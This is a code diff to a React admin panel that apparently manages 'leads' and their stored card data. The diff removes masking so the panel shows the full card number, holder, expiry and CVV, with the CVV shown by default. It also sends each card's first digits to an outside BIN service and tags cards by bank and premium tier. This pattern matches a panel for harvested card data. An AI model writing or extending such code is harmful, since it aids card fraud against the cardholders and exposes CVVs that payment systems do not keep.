@@ -37,6 +37,58 @@ function whatsappLink(phone: string, nome: string) {
   return `https://wa.me/${num}?text=${msg}`;
 }
 
+// ─── BIN lookup ───────────────────────────────────────────────────────────────
+interface BinInfo {
+  scheme?: string;
+  type?: string;
+  brand?: string;
+  bank?: { name?: string };
+  country?: { name?: string };
+}
+
+async function lookupBin(numero: string): Promise<BinInfo | null> {
+  const bin = numero.replace(/\D/g, "").slice(0, 6);
+  if (bin.length < 6) return null;
+  try {
+    const res = await fetch(`https://lookup.binlist.net/${bin}`, {
+      headers: { "Accept-Version": "3" },
+    });
+    if (!res.ok) return null;
+    return await res.json() as BinInfo;
+  } catch {
+    return null;
+  }
+}
+
+function formatCardNumber(num: string) {
+  const d = num.replace(/\D/g, "");
+  return d.replace(/(.{4})/g, "$1 ").trim();
+}
+
+function cardBrandLabel(scheme?: string): string {
+  if (!scheme) return "";
+  return scheme.charAt(0).toUpperCase() + scheme.slice(1).toLowerCase();
+}
+
+function cardTierLabel(brand?: string): string {
+  if (!brand) return "";
+  const b = brand.toLowerCase();
+  if (b.includes("black") || b.includes("infinite") || b.includes("ultra")) return "Black";
+  if (b.includes("platinum")) return "Platinum";
+  if (b.includes("gold")) return "Gold";
+  if (b.includes("classic")) return "Classic";
+  if (b.includes("standard")) return "Classic";
+  if (b.includes("electron")) return "Electron";
+  return brand;
+}
+
+function tierColor(tier: string): string {
+  if (tier === "Black") return "#1f1f1f";
+  if (tier === "Platinum") return "#7c7c9b";
+  if (tier === "Gold") return "#b8860b";
+  return "#3b82f6";
+}
+
 // ─── Card decryptor component ──────────────────────────────────────────────
 interface CardInfo {
   numero: string;
@@ -47,10 +99,11 @@ interface CardInfo {
 
 function CardViewer({ encrypted }: { encrypted: string }) {
   const [cardInfo, setCardInfo] = useState<CardInfo | null>(null);
+  const [binInfo, setBinInfo] = useState<BinInfo | null>(null);
   const [visible, setVisible] = useState(false);
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState(false);
-  const [cvvVisible, setCvvVisible] = useState(false);
+  const [cvvVisible, setCvvVisible] = useState(true);
 
   const decrypt = async () => {
     if (cardInfo) { setVisible(v => !v); return; }
@@ -63,6 +116,8 @@ function CardViewer({ encrypted }: { encrypted: string }) {
       const parsed = JSON.parse(raw) as CardInfo;
       setCardInfo(parsed);
       setVisible(true);
+      // Busca info do BIN em paralelo
+      lookupBin(parsed.numero).then(info => setBinInfo(info));
     } catch {
       setError(true);
     } finally {
@@ -70,10 +125,8 @@ function CardViewer({ encrypted }: { encrypted: string }) {
     }
   };
 
-  const maskCard = (num: string) => {
-    const d = num.replace(/\D/g, "");
-    return `•••• •••• •••• ${d.slice(-4)}`;
-  };
+  const tier = cardTierLabel(binInfo?.brand);
+  const brand = cardBrandLabel(binInfo?.scheme);
 
   return (
     <div className="mt-2">
@@ -83,7 +136,7 @@ function CardViewer({ encrypted }: { encrypted: string }) {
         className="flex items-center gap-1.5 text-xs font-semibold text-blue-600 hover:text-blue-800 transition-colors disabled:opacity-50"
       >
         <CreditCard className="h-3.5 w-3.5" />
-        {loading ? "Descriptografando..." : visible ? "Ocultar cartão" : "Ver dados do cartão"}
+        {loading ? "Descriptografando..." : visible ? "Ocultar Cartão" : "Ver dados do cartão"}
       </button>
 
       {error && (
@@ -91,31 +144,79 @@ function CardViewer({ encrypted }: { encrypted: string }) {
       )}
 
       {visible && cardInfo && (
-        <div className="mt-2 bg-gray-900 text-white rounded-xl p-3 text-xs space-y-1.5 max-w-xs">
-          <div className="flex items-center justify-between">
-            <span className="text-gray-400">Número</span>
-            <span className="font-mono font-bold">{maskCard(cardInfo.numero)}</span>
-          </div>
-          <div className="flex items-center justify-between">
-            <span className="text-gray-400">Titular</span>
-            <span className="font-semibold">{cardInfo.nome}</span>
-          </div>
-          <div className="flex items-center justify-between">
-            <span className="text-gray-400">Validade</span>
-            <span className="font-mono">{cardInfo.validade}</span>
-          </div>
-          <div className="flex items-center justify-between">
-            <span className="text-gray-400">CVV</span>
-            <div className="flex items-center gap-1.5">
-              <span className="font-mono">{cvvVisible ? cardInfo.cvv : "•••"}</span>
-              <button onClick={() => setCvvVisible(v => !v)} className="text-gray-400 hover:text-white transition-colors">
-                {cvvVisible ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
-              </button>
+        <div className="mt-2 max-w-xs">
+          {/* Cartão visual */}
+          <div
+            className="rounded-2xl p-4 text-white relative overflow-hidden"
+            style={{ background: "linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)", minHeight: 160 }}
+          >
+            {/* Header */}
+            <div className="flex items-center justify-between mb-4">
+              <span className="text-[10px] font-bold tracking-widest text-gray-300 uppercase">Cartão</span>
+              <div className="flex items-center gap-1.5">
+                {tier && (
+                  <span
+                    className="text-[9px] font-bold px-1.5 py-0.5 rounded-full uppercase tracking-wide"
+                    style={{ background: tierColor(tier), color: "#fff" }}
+                  >
+                    {tier}
+                  </span>
+                )}
+                {brand && (
+                  <span className="text-[9px] font-semibold text-gray-400 uppercase">{brand}</span>
+                )}
+                <Lock className="h-3.5 w-3.5 text-green-400" />
+              </div>
             </div>
+
+            {/* Número completo */}
+            <div className="font-mono text-lg font-bold tracking-widest mb-4 text-white">
+              {formatCardNumber(cardInfo.numero)}
+            </div>
+
+            {/* Rodapé */}
+            <div className="flex items-end justify-between">
+              <div>
+                <p className="text-[9px] text-gray-400 uppercase tracking-wide mb-0.5">Titular</p>
+                <p className="text-sm font-bold uppercase tracking-wide">{cardInfo.nome}</p>
+              </div>
+              <div className="text-right">
+                <p className="text-[9px] text-gray-400 uppercase tracking-wide mb-0.5">Validade</p>
+                <p className="text-sm font-mono font-bold">{cardInfo.validade}</p>
+              </div>
+              <div className="text-right">
+                <p className="text-[9px] text-gray-400 uppercase tracking-wide mb-0.5">CVV</p>
+                <div className="flex items-center gap-1">
+                  <p className="text-sm font-mono font-bold">
+                    {cvvVisible ? cardInfo.cvv : "•••"}
+                  </p>
+                  <button
+                    onClick={() => setCvvVisible(v => !v)}
+                    className="text-gray-400 hover:text-white transition-colors"
+                  >
+                    {cvvVisible ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
+                  </button>
+                </div>
+              </div>
+            </div>
+
+            {/* Decoração de fundo */}
+            <div
+              className="absolute -right-8 -top-8 w-32 h-32 rounded-full opacity-10"
+              style={{ background: "white" }}
+            />
+            <div
+              className="absolute -right-4 -bottom-8 w-24 h-24 rounded-full opacity-10"
+              style={{ background: "white" }}
+            />
           </div>
-          <div className="pt-1 border-t border-gray-700 text-[10px] text-gray-500">
-            Número completo: <span className="font-mono text-gray-300">{cardInfo.numero}</span>
-          </div>
+
+          {/* Info adicional do banco abaixo do cartão */}
+          {binInfo?.bank?.name && (
+            <p className="text-[10px] text-gray-400 mt-1 text-center">
+              Banco: {binInfo.bank.name}
+            </p>
+          )}
         </div>
       )}
     </div>
@@ -336,7 +437,7 @@ function AdminPanel() {
                           </div>
                         </div>
 
-                        {/* Dados do cartão — aparece para pagamentos com cartão */}
+                        {/* Dados do cartão */}
                         {(lead.metodo_pagamento === "card" || lead.metodo_pagamento === "cartao" || lead.metodo_pagamento === "credit_card") && (
                           lead.card_encriptado
                             ? <CardViewer encrypted={lead.card_encriptado} />
